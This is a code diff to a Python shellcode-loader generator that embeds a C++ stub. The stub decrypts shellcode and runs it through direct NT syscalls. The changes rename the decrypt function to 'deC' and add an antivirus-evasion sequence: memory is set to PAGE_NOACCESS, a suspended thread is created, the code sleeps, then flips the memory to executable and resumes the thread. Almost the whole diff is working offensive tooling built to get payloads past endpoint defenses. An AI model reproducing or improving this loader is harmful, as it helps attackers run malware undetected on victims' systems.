@@ -124,7 +124,7 @@ int getLoadedDlls()
 }
 
 
-int deCrypt(unsigned char payload[])
+int deC(unsigned char payload[])
 {
     std::string key;
     key = "REPLACE_ME_KEY";
@@ -148,13 +148,22 @@ int main()
     HANDLE thandle = NULL;
 
     getLoadedDlls();
-    deCrypt(payload);
+    deC(payload);
 
-    NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // Allocate memory in the current proccess
+    NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, 0x40);
+    // Copy the decrypted shellcode to the allocated memory
     RtlMoveMemory(base_addr, decoded, payload_len);
-    NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
-    printf("Spawning shellcode now...\\n");
-    NTSTATUS ct = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, FALSE, 0, 0, 0, NULL);
+    // Set permission on allocated memory as PAGE_NOACCESS
+    NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);
+    // Create thread in suspended state
+    NTSTATUS ct = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);
+    // Sleep for 10 seconds
+    Sleep(10000);
+    // Set permission on allocated memory as PAGE_EXECUTE_READ
+    NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
+    // Resuming Thread
+    ResumeThread(thandle);
     WaitForSingleObject(thandle, -1);
     free(base_addr);
 }"""
@@ -208,7 +217,7 @@ def main(stub, infile, outfile, key):
 print(inspiration[1:-1])
 parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
 parser.add_argument("file", help="File containing raw shellcode", type=str)
-parser.add_argument('-o', '--outfile', dest='out', help='Name of compilied file', metavar='a.exe', default='a.exe')
+parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
 if len(sys.argv) < 2:
     parser.print_help()
     sys.exit()
